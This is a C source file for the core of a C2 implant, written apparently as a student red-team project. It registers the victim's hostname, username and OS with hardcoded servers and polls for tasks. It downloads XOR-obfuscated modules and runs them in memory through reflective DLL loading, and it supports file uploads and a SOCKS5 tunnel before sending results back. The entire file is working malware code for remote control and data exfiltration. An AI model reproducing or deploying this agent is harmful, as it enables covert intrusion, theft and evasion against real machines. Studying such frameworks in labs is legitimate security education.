/*
 * ============================================================
 *  core.c — Cœur de l'agent C2 minimal
 *
 *  Contient : enregistrement, polling, téléchargement des
 *             modules, pack des arguments, dispatch vers le
 *             moteur d'exécution, envoi des résultats.
 *
 *  PAS de registre de modules built-in.
 *  Toutes les tâches passent par RDLL (défaut : rdll).
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "platform.h"
#include "config.h"
#include "utils.h"
#include "http.h"
#include "execution_engine.h"
#include "core.h"
#include "tunnel.h"
#include "cJSON.h"
#include "payload_obfuscation.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ============================================================
 *  PACKING SPÉCIAL POUR UPLOAD
 *
 *  Crée un buffer BeaconData avec deux entrées :
 *    1. [4-byte LE = len][dest_path]
 *    2. [4-byte LE = len][b64_data ]
 *
 *  Le module mod_upload.c lit ces deux entrées avec
 *  BeaconDataExtract() × 2.
 * ============================================================ */
static unsigned char *pack_upload_args(const char *dest, const char *b64_data,
                                        size_t *out_len) {
    size_t dest_len = strlen(dest);
    size_t b64_len  = strlen(b64_data);
    size_t total    = 4 + dest_len + 4 + b64_len;

    unsigned char *buf = (unsigned char *)malloc(total);
    if (!buf) return NULL;

    /* Entrée 1 : chemin destination */
    buf[0] = (unsigned char)((dest_len >>  0) & 0xFF);
    buf[1] = (unsigned char)((dest_len >>  8) & 0xFF);
    buf[2] = (unsigned char)((dest_len >> 16) & 0xFF);
    buf[3] = (unsigned char)((dest_len >> 24) & 0xFF);
    memcpy(buf + 4, dest, dest_len);

    /* Entrée 2 : données base64 */
    size_t off = 4 + dest_len;
    buf[off+0] = (unsigned char)((b64_len >>  0) & 0xFF);
    buf[off+1] = (unsigned char)((b64_len >>  8) & 0xFF);
    buf[off+2] = (unsigned char)((b64_len >> 16) & 0xFF);
    buf[off+3] = (unsigned char)((b64_len >> 24) & 0xFF);
    memcpy(buf + off + 4, b64_data, b64_len);

    *out_len = total;
    return buf;
}

/* ── Liste des serveurs C2 ──────────────────────────────────── */
const char *C2_SERVER_LIST[] = {
    "http://192.168.9.1:8000",    /* VMnet1 Private Network */
    "http://192.168.8.1:8000",    /* VMnet8 NAT             */
    "http://192.168.100.1:8000",  /* Réseau secondaire      */
    "http://127.0.0.1:8000",      /* Tests locaux           */
    NULL
};


/* ============================================================
 *  ENREGISTREMENT
 * ============================================================ */

int try_connect_any_server(AgentContext *ctx, const SystemInfo *si,
                           const char *saved_id, int has_saved) {
    for (int i = 0; C2_SERVER_LIST[i] != NULL; i++) {
        char url[512];
        snprintf(url, sizeof(url), "%s/agent/register", C2_SERVER_LIST[i]);

        cJSON *p = cJSON_CreateObject();
        cJSON_AddStringToObject(p, "hostname", si->hostname);
        cJSON_AddStringToObject(p, "username", si->username);
        cJSON_AddStringToObject(p, "os",       si->os);
        if (has_saved) cJSON_AddStringToObject(p, "agent_id", saved_id);
        char *body = cJSON_PrintUnformatted(p);
        cJSON_Delete(p);

        HttpBuffer resp = {0};
        long code = http_post_json(url, body, &resp);
        free(body);

        if (code == 200 && resp.data) {
            cJSON *j = cJSON_Parse(resp.data);
            if (j) {
                cJSON *id = cJSON_GetObjectItemCaseSensitive(j, "agent_id");
                if (cJSON_IsString(id)) {
                    strncpy(ctx->server_url, C2_SERVER_LIST[i],
                            sizeof(ctx->server_url) - 1);
                    strncpy(ctx->agent_id, id->valuestring,
                            sizeof(ctx->agent_id) - 1);
                    save_agent_id(ctx->agent_id);

                    cJSON *msg = cJSON_GetObjectItemCaseSensitive(j, "message");
                    const char *action = (msg &&
                        strcmp(msg->valuestring, "Reconnexion") == 0)
                        ? "Reconnecté" : "Enregistré";
                    printf("[+] %s via %s — ID: %s\n",
                           action, C2_SERVER_LIST[i], ctx->agent_id);
                    ctx->reconnect_attempts = 0;
                    cJSON_Delete(j);
                    free(resp.data);
                    return 1;
                }
                cJSON_Delete(j);
            }
        }
        if (resp.data) free(resp.data);
    }
    return 0;
}

int register_agent(AgentContext *ctx, const SystemInfo *si) {
    char saved_id[16] = {0};
    int  has_saved    = load_saved_agent_id(saved_id, sizeof(saved_id));

    while (ctx->running) {
        if (try_connect_any_server(ctx, si, saved_id, has_saved))
            return 1;

        int delay = get_backoff_delay(ctx);
        printf("[!] Aucun serveur joignable — retry dans %ds\n", delay);
        sleep_ms(delay * 1000);
    }
    return 0;
}


/* ============================================================
 *  POLLING
 * ============================================================ */

int poll_server(AgentContext *ctx, PollResponse *pr) {
    char url[512];
    snprintf(url, sizeof(url), "%s/agent/%s/poll",
             ctx->server_url, ctx->agent_id);

    HttpBuffer resp = {0};
    long code = http_get(url, &resp);

    if (code == 404) {
        ctx->agent_id[0] = '\0';
        if (resp.data) free(resp.data);
        return -1;
    }
    if (code != 200 || !resp.data) {
        if (resp.data) free(resp.data);
        return 0;
    }

    memset(pr, 0, sizeof(PollResponse));
    pr->file_data = NULL;

    cJSON *j = cJSON_Parse(resp.data);
    free(resp.data);
    if (!j) return 0;

    cJSON *ht = cJSON_GetObjectItemCaseSensitive(j, "has_task");
    if (!cJSON_IsTrue(ht)) { cJSON_Delete(j); return 0; }

    pr->has_task = 1;
    cJSON *item;

    item = cJSON_GetObjectItemCaseSensitive(j, "task_id");
    if (cJSON_IsString(item))
        strncpy(pr->task_id, item->valuestring, sizeof(pr->task_id) - 1);

    item = cJSON_GetObjectItemCaseSensitive(j, "command");
    if (cJSON_IsString(item))
        strncpy(pr->command, item->valuestring, sizeof(pr->command) - 1);

    item = cJSON_GetObjectItemCaseSensitive(j, "module");
    if (cJSON_IsString(item))
        strncpy(pr->module, item->valuestring, sizeof(pr->module) - 1);

    item = cJSON_GetObjectItemCaseSensitive(j, "technique");
    if (cJSON_IsString(item) && item->valuestring[0] != '\0')
        strncpy(pr->technique, item->valuestring, sizeof(pr->technique) - 1);
    else if (cJSON_IsString(cJSON_GetObjectItemCaseSensitive(j, "module")) &&
             (strncmp(cJSON_GetObjectItemCaseSensitive(j, "module")->valuestring,
                      "tunnel_", 7) == 0))
        strncpy(pr->technique, "-", sizeof(pr->technique) - 1); /* tunnel: pas de technique */
    else
        strncpy(pr->technique, "rdll", sizeof(pr->technique) - 1); /* défaut modules */

    item = cJSON_GetObjectItemCaseSensitive(j, "filename");
    if (cJSON_IsString(item))
        strncpy(pr->filename, item->valuestring, sizeof(pr->filename) - 1);

    /* file_data peut être volumineux (upload) — copier sur le tas */
    item = cJSON_GetObjectItemCaseSensitive(j, "file_data");
    if (cJSON_IsString(item) && item->valuestring[0] != '\0')
        pr->file_data = strdup(item->valuestring);

    cJSON_Delete(j);
    return 1;
}


/* ============================================================
 *  ENVOI DU RÉSULTAT
 * ============================================================ */

int send_result(AgentContext *ctx, const char *task_id,
                const char *output, const char *status) {
    char url[512];
    snprintf(url, sizeof(url), "%s/agent/result", ctx->server_url);

    cJSON *p = cJSON_CreateObject();
    cJSON_AddStringToObject(p, "task_id",  task_id);
    cJSON_AddStringToObject(p, "agent_id", ctx->agent_id);
    cJSON_AddStringToObject(p, "output",   output);
    cJSON_AddStringToObject(p, "status",   status);
    char *body = cJSON_PrintUnformatted(p);
    cJSON_Delete(p);

    HttpBuffer resp = {0};
    long code = http_post_json(url, body, &resp);
    free(body);
    if (resp.data) free(resp.data);
    return (code == 200);
}


/* ============================================================
 *  TÉLÉCHARGEMENT D'UN MODULE
 *
 *  GET /agent/modules/<name>?technique=rdll&arch=x64&agent_id=<id>
 *  Retourne un JSON contenant le module base64 encodé et XOR-obfusqué.
 *  L'appelant est responsable de libérer out_bytes.
 * ============================================================ */
static int download_module(AgentContext *ctx,
                           const char   *module_name,
                           technique_t   technique,
                           unsigned char **out_bytes,
                           size_t        *out_size) {
    const char *arch = (sizeof(void *) == 8) ? "x64" : "x86";

    char url[512];
    snprintf(url, sizeof(url),
             "%s/agent/modules/%s?technique=%s&arch=%s&agent_id=%s",
             ctx->server_url, module_name,
             technique_to_string(technique), arch, ctx->agent_id);

    HttpBuffer resp = {0};
    long code = http_get(url, &resp);

    if (code != 200 || !resp.data || resp.size == 0) {
        printf("[!] Téléchargement '%s/%s' échoué — HTTP %ld\n",
               module_name, technique_to_string(technique), code);
        if (resp.data) free(resp.data);
        return 0;
    }

    cJSON *frame = cJSON_Parse(resp.data);
    cJSON *encoded = frame ? cJSON_GetObjectItemCaseSensitive(frame, "payload") : NULL;
    cJSON *obfuscation = frame ? cJSON_GetObjectItemCaseSensitive(frame, "obfuscation") : NULL;
    if (!frame || !cJSON_IsString(encoded) || !cJSON_IsString(obfuscation) ||
        strcmp(obfuscation->valuestring, "xor-v1") != 0) {
        if (frame) cJSON_Delete(frame);
        free(resp.data);
        printf("[!] Trame module invalide ou obfuscation inconnue\n");
        return 0;
    }

    size_t encrypted_size = 0;
    unsigned char *encrypted = b64_decode_alloc(
        encoded->valuestring, strlen(encoded->valuestring), &encrypted_size);
    cJSON_Delete(frame);
    free(resp.data);
    if (!encrypted) {
        printf("[!] Décodage base64 du module échoué\n");
        return 0;
    }

    *out_bytes = xor_payload(encrypted, encrypted_size, ctx->agent_id);
    free(encrypted);
    *out_size = encrypted_size;
    if (!*out_bytes && encrypted_size > 0) {
        printf("[!] Déchiffrement XOR du module échoué\n");
        return 0;
    }
    printf("[*] Module '%s/%s' téléchargé : %zu bytes\n",
           module_name, technique_to_string(technique), resp.size);
    return 1;
}


/* ============================================================
 *  PACKING DES ARGUMENTS (format BeaconDataParse)
 *
 *  Transforme la commande brute reçue du serveur en buffer
 *  compatible avec BeaconDataParse / BeaconDataExtract.
 *
 *  Format : [4 octets LE = longueur][données]
 *
 *  Exemple : "whoami" → [06 00 00 00][whoami]
 *
 *  L'appelant libère le buffer retourné.
 * ============================================================ */
static unsigned char *pack_args(const char *command, size_t *out_len) {
    size_t cmd_len = strlen(command);
    /* +1 octet après les données pour garantir un null-terminator.
     * BeaconDataExtract retourne un pointeur dans ce buffer ; les
     * modules passent ce pointeur aux API Windows (CreateFileA, etc.)
     * qui exigent des chaînes null-terminées. args_len reste 4+cmd_len
     * (le null n'est pas compté dans la taille des args). */
    unsigned char *buf = (unsigned char *)malloc(4 + cmd_len + 1);
    if (!buf) return NULL;

    buf[0] = (unsigned char)((cmd_len >>  0) & 0xFF);
    buf[1] = (unsigned char)((cmd_len >>  8) & 0xFF);
    buf[2] = (unsigned char)((cmd_len >> 16) & 0xFF);
    buf[3] = (unsigned char)((cmd_len >> 24) & 0xFF);
    memcpy(buf + 4, command, cmd_len);
    buf[4 + cmd_len] = '\0';   /* null-terminator de sécurité */

    *out_len = 4 + cmd_len;
    return buf;
}


/* ============================================================
 *  BOUCLE PRINCIPALE — chargement dynamique exclusif
 * ============================================================ */
void poll_loop(AgentContext *ctx, const SystemInfo *si) {
    printf("[*] Agent %s actif — polling toutes les ~%dms\n",
           ctx->agent_id, POLL_INTERVAL_MS);

    while (ctx->running) {
        PollResponse pr = {0};
        int ret = poll_server(ctx, &pr);

        /* Agent inconnu du serveur → réenregistrement immédiat */
        if (ret == -1) {
            if (!register_agent(ctx, si)) break;
            continue;
        }

        if (ret == 1 && pr.has_task) {
            printf("[>] Task %-12s | module=%-12s | tech=%s | %.60s\n",
                   pr.task_id, pr.module, pr.technique, pr.command);

            /* ── Commandes tunnel (pas de module à télécharger) ─ */
            if (strcmp(pr.module, "tunnel_enable") == 0) {
                if (!tunnel_is_active())
                    tunnel_start(ctx->server_url, ctx->agent_id);
                send_result(ctx, pr.task_id,
                            "[TUNNEL] Actif — proxy SOCKS5 prêt", "success");
                if (pr.file_data) { free(pr.file_data); pr.file_data = NULL; }
                sleep_ms(get_jittered_interval());
                continue;
            }
            if (strcmp(pr.module, "tunnel_disable") == 0) {
                tunnel_stop();
                send_result(ctx, pr.task_id, "[TUNNEL] Arrêté", "success");
                if (pr.file_data) { free(pr.file_data); pr.file_data = NULL; }
                sleep_ms(get_jittered_interval());
                continue;
            }

            /* ── Étape 1 : déterminer la technique ─────────── */
            technique_t t = technique_from_string(pr.technique);

            /* ── Étape 2 : télécharger le module ───────────── */
            unsigned char *mod_bytes = NULL;
            size_t         mod_size  = 0;

            if (!download_module(ctx, pr.module, t, &mod_bytes, &mod_size)) {
                char err[256];
                snprintf(err, sizeof(err),
                         "[ERREUR] Module '%s' (%s) introuvable sur le serveur. "
                         "Compilez d'abord : make dll-x64",
                         pr.module, pr.technique);
                send_result(ctx, pr.task_id, err, "error");
                if (pr.file_data) { free(pr.file_data); pr.file_data = NULL; }
                sleep_ms(get_jittered_interval());
                continue;
            }

            /* ── Étape 3 : packer les arguments ────────────── *
             * Upload : deux entrées [dest_path][b64_data].    *
             * Autres : une entrée  [command].                 */
            size_t         args_len = 0;
            unsigned char *args     = NULL;

            if (strcmp(pr.module, "upload") == 0) {
                /* Extraire dest de "upload C:\path" */
                char dest[1024] = {0};
                const char *sp = strchr(pr.command, ' ');
                const char *src = sp ? sp + 1 : pr.command;
                size_t src_len  = strlen(src);
                if (src_len >= sizeof(dest)) src_len = sizeof(dest) - 1;
                memcpy(dest, src, src_len);
                dest[src_len] = '\0';

                if (!pr.file_data || dest[0] == '\0') {
                    free(mod_bytes);
                    send_result(ctx, pr.task_id,
                                "[ERREUR] Chemin ou données upload manquants", "error");
                    if (pr.file_data) { free(pr.file_data); pr.file_data = NULL; }
                    sleep_ms(get_jittered_interval());
                    continue;
                }
                args = pack_upload_args(dest, pr.file_data, &args_len);
            } else {
                args = pack_args(pr.command, &args_len);
            }

            if (!args) {
                free(mod_bytes);
                send_result(ctx, pr.task_id,
                            "[ERREUR] Allocation mémoire args échouée", "error");
                if (pr.file_data) { free(pr.file_data); pr.file_data = NULL; }
                sleep_ms(get_jittered_interval());
                continue;
            }

            /* ── Étape 4 : exécuter via le moteur ──────────── */
            printf("[*] Exécution '%s' via %s...\n", pr.module, pr.technique);
            fflush(stdout);
            module_result_t result = execute_module(
                t, mod_bytes, mod_size, args, args_len
            );
            free(mod_bytes);
            free(args);
            printf("[*] Fin exec : status=%d len=%zu err=%s\n",
                   result.status, result.data_len,
                   result.error_msg ? result.error_msg : "ok");
            fflush(stdout);

            /* ── Étape 5 : envoyer le résultat ─────────────── */
            const char *status;
            const char *output;
            char        err_buf[512];

            if (result.status == 0 && result.data && result.data_len > 0) {
                output = (const char *)result.data;
                status = "success";
            } else {
                snprintf(err_buf, sizeof(err_buf), "[ERREUR] %s",
                         result.error_msg ? result.error_msg : "Exécution échouée");
                output = err_buf;
                status = "error";
            }

            if (send_result(ctx, pr.task_id, output, status))
                printf("[+] Résultat [%s] envoyé (%s/%s, %zu bytes)\n",
                       status, pr.module, pr.technique,
                       result.data ? result.data_len : strlen(err_buf));
            else
                printf("[!] Échec envoi résultat pour task %s\n", pr.task_id);

            free_module_result(&result);
            if (pr.file_data) { free(pr.file_data); pr.file_data = NULL; }
        }

        sleep_ms(get_jittered_interval());
    }
}
